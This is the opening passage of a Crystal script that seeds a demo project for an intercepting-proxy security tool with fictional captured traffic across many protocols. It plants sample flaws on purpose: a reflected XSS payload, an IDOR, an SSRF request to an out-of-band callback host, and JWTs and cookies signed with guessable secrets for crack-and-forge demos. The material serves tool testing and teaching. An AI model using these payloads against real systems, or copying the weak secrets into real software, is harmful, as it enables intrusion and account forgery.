# Seeds a "demo" registry project with a realistic, varied dataset so every tab in
# the TUI has something real to explore:
#
#   History / Target(Sitemap+Discover) / Issues / Notes / Scope       — captured traffic
#   Repeater / Fuzzer / Miner / Sequencer                             — pre-seeded workbench sessions
#   Rewriter                                                          — match&replace rules + session bindings
#   Colormarker                                                       — History row-colour rules
#   OAST                                                              — an out-of-band listener with callbacks
#   Probe                                                             — passive scan + active findings + custom rules
#   Decoder / JWT / Comparer                                          — pre-loaded sub-tabs and material
#   Env (bindings)                                                    — project `$KEY` vars a Repeater tab uses
#
# The captured traffic covers every PROTO label History can print — HTTP/HTTPS, WS/WSS,
# GRPC/GRPCS, SSE/SSES and a short-circuited STUB — over both transports, plus the shapes
# that are not a clean 200: an RFC 8441 extended CONNECT, a `connect-udp` tunnel, MQTT and
# graphql-transport-ws over a socket, gRPC server streaming / trailers-only failures /
# grpc-web / a body cut mid-frame, a gzip'd chunked body, and flows in Pending, Aborted and
# Error state. See the "Act three" section for the whole list.
#
# It also covers every METHOD a real client sends — the eight RFC 9110 registers, the ten
# WebDAV/DeltaV/DASL adds, and the three a hunter's own tooling puts on the wire — against
# the hosts, paths, statuses, sizes and durations that stress a fixed-width column: a
# 15-character verb, a punycode and a homograph host, a double-width path, a right-to-left
# run, a zero-width space, a body the capture cap cut at 2 KB of 2.5 GB, and a 3.5-hour long
# poll. That is the "Act five" section, and it exists to be LOOKED AT: a rendering defect in
# a column is not something a spec can assert, only something a demo can show.
#
#   crystal run scripts/seed_demo.cr
#
# Re-runnable: it wipes any existing "demo" project first, then recreates it.
require "file_utils"
require "base64"
require "compress/gzip"
require "openssl/hmac"
require "uri"
require "../src/gori"
require "../src/gori/project_registry"

include Gori

alias S = Gori::Store
alias FS = Gori::FlowSource

US_PER_MIN = 60_000_000_i64

# Build raw HTTP/1.1 wire bytes + insert one complete flow; returns its id.
def add_flow(store : S, created_at : Int64, *,
             scheme = "https", host : String, port = 443,
             method = "GET", target : String,
             req_headers = {} of String => String, req_body : String? = nil,
             req_ctype = "application/json",
             status : Int32, reason : String, ctype : String? = nil,
             resp_headers = {} of String => String, resp_body : String? = nil,
             http = "HTTP/1.1", dur_us = 28_000_i64,
             state = S::FlowState::Complete,
             source = FS::Kind::Proxy, source_surface : FS::Surface? = nil,
             source_ref : String? = nil) : Int64
  req_head = String.build do |b|
    b << method << ' ' << target << ' ' << http << "\r\n"
    b << "Host: " << host << "\r\n"
    b << "User-Agent: gori-demo/1.0\r\n"
    b << "Accept: */*\r\n"
    req_headers.each { |k, v| b << k << ": " << v << "\r\n" }
    if body = req_body
      b << "Content-Type: " << req_ctype << "\r\n"
      b << "Content-Length: " << body.bytesize << "\r\n"
    end
    b << "\r\n"
  end

  fid = store.insert_flow(S::CapturedRequest.new(
    created_at: created_at, scheme: scheme, host: host, port: port,
    method: method, target: target, http_version: http,
    head: req_head.to_slice, body: req_body.try(&.to_slice),
    body_size: req_body.try(&.bytesize.to_i64),
    source: source, source_surface: source_surface, source_ref: source_ref))

  resp_head = String.build do |b|
    b << http << ' ' << status << ' ' << reason << "\r\n"
    b << "Server: nginx/1.25.3\r\n"
    b << "Date: Thu, 19 Jun 2026 09:00:00 GMT\r\n"
    b << "Content-Type: " << ctype << "\r\n" if ctype
    b << "Content-Length: " << (resp_body.try(&.bytesize) || 0) << "\r\n"
    resp_headers.each { |k, v| b << k << ": " << v << "\r\n" }
    b << "\r\n"
  end

  store.update_response(S::CapturedResponse.new(
    flow_id: fid, status: status, reason: reason, content_type: ctype,
    head: resp_head.to_slice, body: resp_body.try(&.to_slice),
    body_size: resp_body.try(&.bytesize.to_i64),
    ttfb_us: dur_us // 2, duration_us: dur_us, state: state))
  fid
end

# Lower-level inserter for flows whose heads aren't plain HTTP/1.1 JSON (WebSocket
# upgrades, HTTP/2 gRPC, SSE, SAML form posts): the caller supplies the exact
# request/response head text and raw body bytes. Returns the new flow id.
def raw_flow(store : S, created_at : Int64, *,
             scheme = "https", host : String, port = 443,
             method : String, target : String, http = "HTTP/1.1",
             req_head : String, req_body : Bytes? = nil,
             status : Int32, reason : String? = nil, ctype : String? = nil,
             resp_head : String, resp_body : Bytes? = nil, dur_us = 28_000_i64,
             h2_conn_id : Int64? = nil, h2_stream_id : Int64? = nil,
             connect_protocol : String? = nil, short_circuited = false,
             state = S::FlowState::Complete, error : String? = nil,
             resp_body_size : Int64? = nil, resp_truncated = false,
             advisory : String? = nil,
             source = FS::Kind::Proxy, source_surface : FS::Surface? = nil,
             source_ref : String? = nil) : Int64
  fid = store.insert_flow(S::CapturedRequest.new(
    created_at: created_at, scheme: scheme, host: host, port: port,
    method: method, target: target, http_version: http,
    head: req_head.to_slice, body: req_body,
    h2_conn_id: h2_conn_id, h2_stream_id: h2_stream_id,
    short_circuited: short_circuited, connect_protocol: connect_protocol,
    source: source, source_surface: source_surface, source_ref: source_ref))

  # `resp_body_size` is the TRUE wire size, which is only ever DIFFERENT from the stored
  # body when the capture cap cut it — that pair (a small blob, a large declared size,
  # `body_truncated`) is what makes the detail pane draw its "body truncated at capture cap"
  # banner and the SIZE column report the bytes the origin really sent.
  store.update_response(S::CapturedResponse.new(
    flow_id: fid, status: status, reason: reason, content_type: ctype,
    head: resp_head.to_slice, body: resp_body,
    body_truncated: resp_truncated, body_size: resp_body_size, advisory: advisory,
    ttfb_us: dur_us // 2, duration_us: dur_us, state: state, error: error))
  fid
end

# Build a minimal HTTP/1.1 request string for replay/fuzz/miner seed rows.
def replay_req(method : String, host : String, target : String,
               headers = {} of String => String, body : String? = nil) : String
  String.build do |b|
    b << method << ' ' << target << " HTTP/1.1\r\n"
    b << "Host: " << host << "\r\n"
    headers.each { |k, v| b << k << ": " << v << "\r\n" }
    if body
      b << "Content-Length: " << body.bytesize << "\r\n"
      b << "\r\n" << body
    else
      b << "\r\n"
    end
  end
end

# protobuf length-delimited string field (wire type 2). Value < 256 bytes so the
# length is a single varint byte — plenty for the demo greeter messages.
def pb_string_field(field : Int32, value : String) : Bytes
  io = IO::Memory.new
  io.write_byte(((field << 3) | 2).to_u8)
  io.write_byte(value.bytesize.to_u8)
  io << value
  io.to_slice
end

# protobuf varint field (wire type 0) — the numbers beside the strings, so the
# schema-less tree the detail pane draws has more than one row shape in it.
def pb_varint_field(field : Int32, value : Int32) : Bytes
  io = IO::Memory.new
  io.write_byte((field << 3).to_u8)
  v = value
  while v >= 0x80
    io.write_byte(((v & 0x7f) | 0x80).to_u8)
    v >>= 7
  end
  io.write_byte(v.to_u8)
  io.to_slice
end

def pb_message(*parts : Bytes) : Bytes
  io = IO::Memory.new
  parts.each { |p| io.write(p) }
  io.to_slice
end

# gRPC length-prefixed frame: 1-byte flag + 4-byte big-endian length + message.
# The flag is a bitmask: 0x01 = the payload is compressed, 0x80 = this is a grpc-web
# TRAILER frame whose payload is ASCII `name: value` lines (grpc-status/grpc-message),
# not protobuf. Same layout `Proxy::H2::Grpc.frame` writes and the detail pane deframes.
def grpc_frame(msg : Bytes, compressed = false, trailer = false) : Bytes
  io = IO::Memory.new
  flag = 0_u8
  flag |= 0x01_u8 if compressed
  flag |= 0x80_u8 if trailer
  io.write_byte(flag)
  io.write_bytes(msg.size.to_u32, IO::ByteFormat::BigEndian)
  io.write(msg)
  io.to_slice
end

# A WebSocket handshake's request/response head pair. Every 101 flow needs the same dozen
# lines and differs in three facts, so those are the arguments: the SUBPROTOCOL it
# negotiates (which is what says "this socket carries MQTT / graphql-transport-ws and not
# just JSON"), the extension it asks for, and the scheme — a `ws://` socket's handshake must
# not claim to have come from an `https://` page.
def ws_heads(host : String, target : String, *, scheme = "https",
             subprotocol : String? = nil, extensions : String? = nil,
             accept_subprotocol = true, accept_extensions = false,
             req_headers = {} of String => String) : {String, String}
  origin = scheme == "https" ? "https://shop.demo.test" : "http://legacy.demo.test:8080"
  req = String.build do |b|
    b << "GET " << target << " HTTP/1.1\r\n"
    b << "Host: " << host << "\r\n"
    b << "User-Agent: gori-demo/1.0\r\n"
    b << "Upgrade: websocket\r\n"
    b << "Connection: Upgrade\r\n"
    b << "Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\r\n"
    b << "Sec-WebSocket-Version: 13\r\n"
    b << "Sec-WebSocket-Protocol: " << subprotocol << "\r\n" if subprotocol
    b << "Sec-WebSocket-Extensions: " << extensions << "\r\n" if extensions
    req_headers.each { |k, v| b << k << ": " << v << "\r\n" }
    b << "Origin: " << origin << "\r\n\r\n"
  end
  resp = String.build do |b|
    b << "HTTP/1.1 101 Switching Protocols\r\n"
    b << "Upgrade: websocket\r\n"
    b << "Connection: Upgrade\r\n"
    b << "Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=\r\n"
    b << "Sec-WebSocket-Protocol: " << subprotocol << "\r\n" if subprotocol && accept_subprotocol
    b << "Sec-WebSocket-Extensions: " << extensions << "\r\n" if extensions && accept_extensions
    b << "\r\n"
  end
  {req, resp}
end

# gzip the way an origin does it, so the body pane has something real to inflate — the
# stored bytes stay the wire bytes and the detail view says "decoded: gzip" over them.
def gzip_bytes(data : String) : Bytes
  io = IO::Memory.new
  Compress::Gzip::Writer.open(io, &.print(data))
  io.to_slice
end

# The h1 chunked wire form, terminating 0-chunk included. Storage keeps the framing
# (P7); only the DISPLAY de-chunks it.
def chunked_bytes(body : Bytes, chunk = 64) : Bytes
  io = IO::Memory.new
  pos = 0
  while pos < body.size
    n = {chunk, body.size - pos}.min
    io << n.to_s(16) << "\r\n"
    io.write(body[pos, n])
    io << "\r\n"
    pos += n
  end
  io << "0\r\n\r\n"
  io.to_slice
end

# MQTT 3.1.1 control packets, the bytes a broker really sees. Every one here is under 128
# bytes, so the remaining-length field is a single byte. These ride a WebSocket as BINARY
# frames — an application protocol that is not HTTP at all, tunnelled through one.
def mqtt_packet(type_flags : UInt8, rest : Bytes) : Bytes
  io = IO::Memory.new
  io.write_byte(type_flags)
  io.write_byte(rest.size.to_u8)
  io.write(rest)
  io.to_slice
end

def mqtt_string(value : String) : Bytes
  io = IO::Memory.new
  io.write_bytes(value.bytesize.to_u16, IO::ByteFormat::BigEndian)
  io << value
  io.to_slice
end

def mqtt_publish(topic : String, payload : String) : Bytes
  io = IO::Memory.new
  io.write(mqtt_string(topic))
  io << payload
  mqtt_packet(0x30_u8, io.to_slice)
end

# base64url without padding (the JWT segment encoding).
def b64url(data : String | Bytes) : String
  Base64.urlsafe_encode(data, padding: false)
end

# Build a real, decodable HS256 JWT so the JWT tab genuinely works on this demo:
# decode shows the claims, "weak secret" cracks WEAK_SECRET, and the alg:none /
# header-inject attacks re-forge from the real header/payload. Deliberately signed
# with a guessable secret so the weak-secret attack (and the matching Issue) land.
WEAK_SECRET = "secret"

def make_jwt(secret : String) : String
  header = %({"alg":"HS256","typ":"JWT"})
  payload = %({"sub":"1","name":"alice","role":"customer","iss":"api.demo.test","iat":1718787600,"exp":1718791200})
  make_jwt(secret, header, payload)
end

def make_jwt(secret : String, header : String, payload : String) : String
  signing_input = "#{b64url(header)}.#{b64url(payload)}"
  sig = b64url(OpenSSL::HMAC.digest(:sha256, secret, signing_input))
  "#{signing_input}.#{sig}"
end

# The three framework session cookies the Cookie workbench (`cookie-decode` in the
# Decoder, `gori run cookie`, MCP `cookie_*`) knows how to parse, verify, crack and
# forge. Each is MINTED HERE by gori's own signer, so the seeded bytes really do
# verify against the weak secret below — the crack is a genuine one, not a story.
COOKIE_SECRET = "s3cr3t"                # Flask / Django
RACK_SECRET   = "changeme-please-12345" # Rack wants a longer key
COOKIE_TS     = 1718787600_i64

Paths.ensure_dirs
registry = ProjectRegistry.new(Paths.projects_dir)

# Fresh start: drop any existing "demo" project.
if existing = registry.list.find { |p| p.name == "demo" }
  registry.delete(existing)
  puts "• removed existing demo project"
end

project = registry.create("demo",
  "Demo target for exploring gori's TUI — a fictional shop, JSON API, OAuth server and " \
  "legacy stack, plus a real, replayable capture of www.hahwul.com. Captured browsing of " \
  "shop/api/cdn/auth/legacy.demo.test with planted issues; every PROTO the column can print " \
  "(HTTP/2, WS and WSS, GRPC and GRPCS, SSE and SSES, a STUB), incl. an RFC 8441 CONNECT, MQTT " \
  "and graphql-ws sockets, grpc-web and a connect-udp tunnel; GraphQL, SAML and framework-signed " \
  "cookies; every HTTP method from TRACE and QUERY to WebDAV's PROPFIND/VERSION-CONTROL, " \
  "with the hosts and paths that stress a fixed-width column (punycode, homograph, RTL, " \
  "double-width, zero-width, a 2.5 GB truncated body); Repeater (incl. a WS and a `$KEY`-bound tab)/" \
  "Fuzzer/Miner/Sequencer sessions; Rewriter rules + session bindings; project env vars; " \
  "colormarker rules; an OAST listener with callbacks; passive AND active probe findings; " \
  "and entity links tying issues and notes to related workbench items.")
store = S.open(project.db_path)
puts "• created project 'demo' at #{project.db_path}"

# The shared bearer token used across the API flows below — a REAL HS256 JWT (weakly
# signed) so the JWT tab can decode/crack/re-forge it and the Sequencer/Decoder have
# something genuine to chew on.
jwt = make_jwt(WEAK_SECRET)

# Timeline: spread flows over the last ~3 hours so History reads like a session.
base = Time.utc.to_unix * 1_000_000_i64 - 180_i64 * US_PER_MIN
t = ->(min : Int32) { base + min.to_i64 * US_PER_MIN }

html = ->(title : String, body : String) {
  "<!doctype html>\n<html><head><title>#{title}</title></head>\n<body>#{body}</body></html>\n"
}

ids = {} of Symbol => Int64

ids[:home] = add_flow(store, t.call(0), host: "shop.demo.test", target: "/",
  status: 200, reason: "OK", ctype: "text/html; charset=utf-8",
  resp_body: html.call("Demo Shop", "<h1>Welcome to Demo Shop</h1><a href=/login>Sign in</a>"))

add_flow(store, t.call(1), host: "shop.demo.test", target: "/robots.txt",
  status: 200, reason: "OK", ctype: "text/plain",
  resp_body: "User-agent: *\nDisallow: /admin\nDisallow: /api/\n")

add_flow(store, t.call(2), scheme: "https", host: "cdn.demo.test", target: "/assets/app.js",
  status: 200, reason: "OK", ctype: "application/javascript",
  resp_body: "console.log('demo shop boot');\nwindow.API='https://api.demo.test/v1';\n")

add_flow(store, t.call(4), host: "shop.demo.test", target: "/login",
  status: 200, reason: "OK", ctype: "text/html; charset=utf-8",
  resp_body: html.call("Sign in", "<form method=post action=/api/login><input name=username><input name=password type=password></form>"))

ids[:login] = add_flow(store, t.call(6), host: "shop.demo.test", target: "/api/login",
  method: "POST", req_body: %({"username":"alice","password":"hunter2"}),
  status: 200, reason: "OK", ctype: "application/json",
  resp_headers: {"Set-Cookie" => "sid=8f3a..; Path=/"},
  resp_body: %({"ok":true,"token":"#{jwt}","user_id":1}))

add_flow(store, t.call(9), host: "api.demo.test", target: "/v1/products",
  req_headers: {"Authorization" => "Bearer #{jwt}"},
  status: 200, reason: "OK", ctype: "application/json",
  resp_body: %([{"id":42,"name":"Blue Widget","price":1999},{"id":43,"name":"Red Widget","price":2499}]))

add_flow(store, t.call(11), host: "api.demo.test", target: "/v1/products/42",
  status: 200, reason: "OK", ctype: "application/json",
  resp_body: %({"id":42,"name":"Blue Widget","price":1999,"stock":17,"sku":"BW-0042"}))

add_flow(store, t.call(13), host: "api.demo.test", target: "/v1/cart", method: "POST",
  req_headers: {"Authorization" => "Bearer #{jwt}"},
  req_body: %({"product_id":42,"qty":2}),
  status: 201, reason: "Created", ctype: "application/json",
  resp_body: %({"cart_id":9,"items":[{"product_id":42,"qty":2}],"total":3998}))

ids[:cart] = add_flow(store, t.call(15), host: "api.demo.test", target: "/v1/cart",
  status: 200, reason: "OK", ctype: "application/json",
  resp_body: %({"cart_id":9,"items":[{"product_id":42,"qty":2}],"total":3998}))

add_flow(store, t.call(17), host: "api.demo.test", target: "/v1/orders",
  status: 401, reason: "Unauthorized", ctype: "application/json",
  resp_body: %({"error":"missing or invalid token"}))

add_flow(store, t.call(20), host: "shop.demo.test", target: "/admin",
  status: 403, reason: "Forbidden", ctype: "text/html; charset=utf-8",
  resp_body: html.call("Forbidden", "<h1>403</h1><p>Admins only.</p>"))

add_flow(store, t.call(23), host: "shop.demo.test", target: "/search?q=widgets",
  status: 200, reason: "OK", ctype: "text/html; charset=utf-8",
  resp_body: html.call("Search", "<p>Results for <b>widgets</b>: 2 found</p>"))

# Reflected XSS candidate: the q value is echoed unescaped into the response.
ids[:xss] = add_flow(store, t.call(26), host: "shop.demo.test",
  target: "/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
  status: 200, reason: "OK", ctype: "text/html; charset=utf-8",
  resp_body: html.call("Search", "<p>Results for <b><script>alert(1)</script></b>: 0 found</p>"))

add_flow(store, t.call(31), host: "api.demo.test", target: "/v1/users/1",
  req_headers: {"Authorization" => "Bearer #{jwt}"},
  status: 200, reason: "OK", ctype: "application/json",
  resp_body: %({"id":1,"name":"Alice","email":"alice@demo.test","role":"customer"}))

# IDOR candidate: same token reads another user's record.
ids[:idor] = add_flow(store, t.call(33), host: "api.demo.test", target: "/v1/users/2",
  req_headers: {"Authorization" => "Bearer #{jwt}"},
  status: 200, reason: "OK", ctype: "application/json",
  resp_body: %({"id":2,"name":"Bob","email":"bob@demo.test","role":"admin","phone":"+1-555-0102"}))

add_flow(store, t.call(36), host: "api.demo.test", target: "/v1/profile", method: "PUT",
  req_headers: {"Authorization" => "Bearer #{jwt}"},
  req_body: %({"name":"Alice A.","newsletter":true}),
  status: 200, reason: "OK", ctype: "application/json",
  resp_body: %({"id":1,"name":"Alice A.","newsletter":true}))

add_flow(store, t.call(38), host: "api.demo.test", target: "/v1/cart/9", method: "DELETE",
  req_headers: {"Authorization" => "Bearer #{jwt}"},
  status: 204, reason: "No Content")

add_flow(store, t.call(41), host: "shop.demo.test", target: "/missing-page",
  status: 404, reason: "Not Found", ctype: "text/html; charset=utf-8",
  resp_body: html.call("Not Found", "<h1>404</h1>"))

# Verbose 500 leaks a stack trace + framework version.
ids[:err500] = add_flow(store, t.call(44), host: "api.demo.test", target: "/v1/debug",
  status: 500, reason: "Internal Server Error", ctype: "text/html; charset=utf-8",
  resp_body: "<h1>RuntimeError at /v1/debug</h1><pre>NoMethodError: undefined method 'each' for nil\n  app/controllers/debug_controller.rb:14\n  rack (3.0.8) lib/rack/handler.rb:88\nDemoFramework 4.2.1</pre>")

# Blind SSRF: an "import from URL" endpoint fetches an operator-supplied URL server-side.
# The response is generic success (no reflected content), so it's confirmed OUT OF BAND —
# the OAST listener seeded below received the resulting DNS + HTTP callback (see its tab).
ids[:ssrf] = add_flow(store, t.call(43), host: "api.demo.test", target: "/v1/import", method: "POST",
  req_headers: {"Authorization" => "Bearer #{jwt}"},
  req_body: %({"url":"https://a1b2c3d4.oast.demo.test/hook?from=api.demo.test"}),
  status: 200, reason: "OK", ctype: "application/json",
  resp_body: %({"status":"ok","imported":true,"bytes":0}))

# Rate limiting: same products listing, second page, throttled.
add_flow(store, t.call(45), host: "api.demo.test", target: "/v1/products?page=2",
  status: 429, reason: "Too Many Requests", ctype: "application/json",
  resp_headers: {"Retry-After" => "30"},
  resp_body: %({"error":"rate limit exceeded"}))

# Stale marketing link, redirects to the current promo page.
add_flow(store, t.call(46), host: "shop.demo.test", target: "/old-promo",
  status: 301, reason: "Moved Permanently",
  resp_headers: {"Location" => "/promo"})

add_flow(store, t.call(47), host: "api.demo.test", target: "/v1/profile/notifications", method: "PATCH",
  req_headers: {"Authorization" => "Bearer #{jwt}"},
  req_body: %({"emailAlerts":false}),
  status: 200, reason: "OK", ctype: "application/json",
  resp_body: %({"emailAlerts":false}))

puts "• inserted the base browsing session (shop / api / cdn), #{ids.size} of them keyed"

# --- Protocol showcase: WebSocket / gRPC / SSE / GraphQL / SAML -------------
# gori captures more than plain request/response. These flows exercise the panes
# the TUI grows for richer protocols (MESSAGES for WebSocket, FRAMES + gRPC
# message deframing for HTTP/2) and the bodies a hunter typically has to decode.

# WebSocket: a chat upgrade (101) with a bidirectional message log. The detail
# view grows a MESSAGES pane for status==101 flows (→ client→server, ← server→client).
ws_req = String.build do |b|
  b << "GET /ws/chat HTTP/1.1\r\n"
  b << "Host: api.demo.test\r\n"
  b << "User-Agent: gori-demo/1.0\r\n"
  b << "Upgrade: websocket\r\n"
  b << "Connection: Upgrade\r\n"
  b << "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
  b << "Sec-WebSocket-Version: 13\r\n"
  b << "Origin: https://shop.demo.test\r\n\r\n"
end
ws_resp = String.build do |b|
  b << "HTTP/1.1 101 Switching Protocols\r\n"
  b << "Upgrade: websocket\r\n"
  b << "Connection: Upgrade\r\n"
  b << "Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=\r\n\r\n"
end
ids[:ws] = raw_flow(store, t.call(48), host: "api.demo.test", method: "GET", target: "/ws/chat",
  req_head: ws_req, status: 101, reason: "Switching Protocols",
  resp_head: ws_resp, dur_us: 1_200_000_i64)
ws_id = ids[:ws]

# direction "out" = client→server, "in" = server→client; opcode 1=text, 2=binary.
ws_msgs = [
  {"out", 1, %({"type":"hello","user":"alice","room":"general"})},
  {"in", 1, %({"type":"welcome","room":"general","online":42})},
  {"in", 1, %({"type":"history","messages":[{"from":"bob","text":"morning!"}]})},
  {"out", 1, %({"type":"msg","text":"hi everyone"})},
  {"in", 1, %({"type":"msg","from":"bob","text":"hey alice!"})},
  {"out", 2, ""}, # binary presence/typing blob — replaced below
  {"in", 1, %({"type":"presence","user":"carol","status":"online"})},
  {"out", 1, %({"type":"typing","state":true})},
  {"in", 1, %({"type":"msg","from":"carol","text":"what's the cart total?"})},
  {"out", 1, %({"type":"ping","t":1718787600})},
  {"in", 1, %({"type":"pong","t":1718787600})},
]
ws_msgs.each do |(dir, op, payload)|
  bytes = op == 2 ? Bytes[0x08, 0x96, 0x01, 0x12, 0x05, 0x61, 0x6c, 0x69, 0x63, 0x65] : payload.to_slice
  store.insert_ws_message(ws_id, dir, op, bytes)
end

# gRPC over HTTP/2: a unary demo.Greeter/SayHello call. The flow links to a raw
# h2 frame log (FRAMES pane) and its application/grpc body deframes into
# length-prefixed protobuf messages (shown as hex — opaque without the .proto).
greeter_conn = store.insert_h2_connection("api.demo.test", 443, "h2")
req_msg = grpc_frame(pb_string_field(1, "alice"))
resp_msg = grpc_frame(pb_string_field(1, "Hello, alice! You have 2 items in your cart."))

# A representative frame log. type: Data=0x0 Headers=0x1 Settings=0x4;
# flags: END_STREAM=0x1 END_HEADERS=0x4. HPACK/SETTINGS payloads are illustrative bytes.
store.insert_h2_frame(greeter_conn, "out", 0x4_u8, 0x0_u8, 0_u32, Bytes[0x00, 0x03, 0x00, 0x00, 0x00, 0x64])
store.insert_h2_frame(greeter_conn, "in", 0x4_u8, 0x0_u8, 0_u32, Bytes[0x00, 0x04, 0x00, 0x10, 0x00, 0x00])
store.insert_h2_frame(greeter_conn, "out", 0x8_u8, 0x0_u8, 0_u32, Bytes[0x00, 0x00, 0x00, 0xff]) # WINDOW_UPDATE
store.insert_h2_frame(greeter_conn, "out", 0x1_u8, 0x4_u8, 1_u32,
  Bytes[0x82, 0x87, 0x41, 0x8a, 0xa0, 0xe4, 0x1d, 0x13, 0x9d, 0x09, 0xb8, 0xf0, 0x1e, 0x07]) # HEADERS
store.insert_h2_frame(greeter_conn, "out", 0x0_u8, 0x1_u8, 1_u32, req_msg)                   # DATA END_STREAM
store.insert_h2_frame(greeter_conn, "in", 0x1_u8, 0x4_u8, 1_u32,
  Bytes[0x88, 0x5f, 0x10, 0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e]) # HEADERS
store.insert_h2_frame(greeter_conn, "in", 0x0_u8, 0x0_u8, 1_u32, resp_msg)                   # DATA
store.insert_h2_frame(greeter_conn, "in", 0x1_u8, 0x5_u8, 1_u32,
  Bytes[0x40, 0x0b, 0x67, 0x72, 0x70, 0x63, 0x2d, 0x73, 0x74, 0x61, 0x74, 0x75, 0x73, 0x01, 0x30]) # trailers grpc-status:0
store.flush                                                                                        # fire-and-forget frames committed before any close

grpc_req_head = String.build do |b|
  b << "POST /demo.Greeter/SayHello HTTP/2\r\n"
  b << "Host: api.demo.test\r\n"
  b << "content-type: application/grpc\r\n"
  b << "te: trailers\r\n"
  b << "grpc-encoding: identity\r\n"
  b << "user-agent: grpc-demo/1.0 grpc-crystal/0.3\r\n\r\n"
end
grpc_resp_head = String.build do |b|
  b << "HTTP/2 200 OK\r\n"
  b << "content-type: application/grpc\r\n"
  b << "grpc-status: 0\r\n"
  b << "grpc-message: OK\r\n\r\n"
end
raw_flow(store, t.call(50), host: "api.demo.test", method: "POST",
  target: "/demo.Greeter/SayHello", http: "HTTP/2",
  req_head: grpc_req_head, req_body: req_msg,
  status: 200, reason: "OK", ctype: "application/grpc",
  resp_head: grpc_resp_head, resp_body: resp_msg, dur_us: 42_000_i64,
  h2_conn_id: greeter_conn, h2_stream_id: 1_i64)

# SSE: a long-lived text/event-stream. gori streams it byte-exact and stores the
# whole stream as the response body (no per-event splitting); it renders as text.
sse_req = String.build do |b|
  b << "GET /v1/stream/prices HTTP/1.1\r\n"
  b << "Host: api.demo.test\r\n"
  b << "User-Agent: gori-demo/1.0\r\n"
  b << "Accept: text/event-stream\r\n\r\n"
end
sse_resp = String.build do |b|
  b << "HTTP/1.1 200 OK\r\n"
  b << "Server: nginx/1.25.3\r\n"
  b << "Content-Type: text/event-stream; charset=utf-8\r\n"
  b << "Cache-Control: no-cache\r\n"
  b << "Connection: keep-alive\r\n\r\n"
end
sse_body = <<-SSE
  retry: 3000

  event: price
  id: 1
  data: {"sku":"BW-0042","price":1999}

  event: price
  id: 2
  data: {"sku":"RW-0043","price":2499}

  event: stock
  id: 3
  data: {"sku":"BW-0042","stock":16}

  : heartbeat

  event: ping
  data: {"t":1718787600}

  SSE
raw_flow(store, t.call(53), host: "api.demo.test", method: "GET", target: "/v1/stream/prices",
  req_head: sse_req, status: 200, reason: "OK", ctype: "text/event-stream",
  resp_head: sse_resp, resp_body: sse_body.to_slice, dur_us: 5_000_000_i64)

# GraphQL: ordinary application/json POSTs to /graphql (query, mutation, and a
# revealing introspection). No special handling — the JSON body is highlighted.
add_flow(store, t.call(56), host: "api.demo.test", target: "/graphql", method: "POST",
  req_headers: {"Authorization" => "Bearer #{jwt}"},
  req_body: %({"operationName":"GetProducts","query":"query GetProducts($first: Int!) { products(first: $first) { id name price } }","variables":{"first":2}}),
  status: 200, reason: "OK", ctype: "application/json",
  resp_body: %({"data":{"products":[{"id":"42","name":"Blue Widget","price":1999},{"id":"43","name":"Red Widget","price":2499}]}}))

add_flow(store, t.call(58), host: "api.demo.test", target: "/graphql", method: "POST",
  req_headers: {"Authorization" => "Bearer #{jwt}"},
  req_body: %({"operationName":"AddToCart","query":"mutation AddToCart($id: ID!, $qty: Int!) { addToCart(productId: $id, qty: $qty) { cartId total } }","variables":{"id":"42","qty":2}}),
  status: 200, reason: "OK", ctype: "application/json",
  resp_body: %({"data":{"addToCart":{"cartId":"9","total":3998}}}))

ids[:gql] = add_flow(store, t.call(60), host: "api.demo.test", target: "/graphql", method: "POST",
  req_body: %({"query":"query IntrospectionQuery { __schema { queryType { name } types { name kind } } }"}),
  status: 200, reason: "OK", ctype: "application/json",
  resp_body: %({"data":{"__schema":{"queryType":{"name":"Query"},"types":[{"name":"Query","kind":"OBJECT"},{"name":"Product","kind":"OBJECT"},{"name":"User","kind":"OBJECT"},{"name":"Mutation","kind":"OBJECT"},{"name":"CartItem","kind":"OBJECT"}]}}}))

# SAML: an SP-initiated SSO assertion POSTed to the ACS. The SAMLResponse is a
# url-encoded base64 XML blob — decode it in the Decoder tab: url-decode → base64-decode.
saml_xml = <<-XML
  <samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_demo123" Version="2.0" IssueInstant="2026-06-26T09:00:00Z" Destination="https://shop.demo.test/saml/acs">
    <saml:Issuer>https://idp.demo.test/metadata</saml:Issuer>
    <samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>
    <saml:Assertion ID="_assert123" Version="2.0" IssueInstant="2026-06-26T09:00:00Z">
      <saml:Issuer>https://idp.demo.test/metadata</saml:Issuer>
      <saml:Subject>
        <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">alice@demo.test</saml:NameID>
      </saml:Subject>
      <saml:Conditions NotBefore="2026-06-26T09:00:00Z" NotOnOrAfter="2026-06-26T09:10:00Z"/>
      <saml:AttributeStatement>
        <saml:Attribute Name="role"><saml:AttributeValue>customer</saml:AttributeValue></saml:Attribute>
        <saml:Attribute Name="email"><saml:AttributeValue>alice@demo.test</saml:AttributeValue></saml:Attribute>
      </saml:AttributeStatement>
    </saml:Assertion>
  </samlp:Response>
  XML
saml_form = "SAMLResponse=#{URI.encode_www_form(Base64.strict_encode(saml_xml))}&RelayState=#{URI.encode_www_form("/dashboard")}"
saml_req = String.build do |b|
  b << "POST /saml/acs HTTP/1.1\r\n"
  b << "Host: shop.demo.test\r\n"
  b << "User-Agent: gori-demo/1.0\r\n"
  b << "Content-Type: application/x-www-form-urlencoded\r\n"
  b << "Origin: https://idp.demo.test\r\n"
  b << "Referer: https://idp.demo.test/sso\r\n"
  b << "Content-Length: " << saml_form.bytesize << "\r\n\r\n"
end
saml_resp = String.build do |b|
  b << "HTTP/1.1 302 Found\r\n"
  b << "Server: nginx/1.25.3\r\n"
  b << "Location: /dashboard\r\n"
  b << "Set-Cookie: session=demo-saml-9f3a; Path=/; HttpOnly; Secure\r\n"
  b << "Content-Length: 0\r\n\r\n"
end
raw_flow(store, t.call(62), host: "shop.demo.test", method: "POST", target: "/saml/acs",
  req_head: saml_req, req_body: saml_form.to_slice,
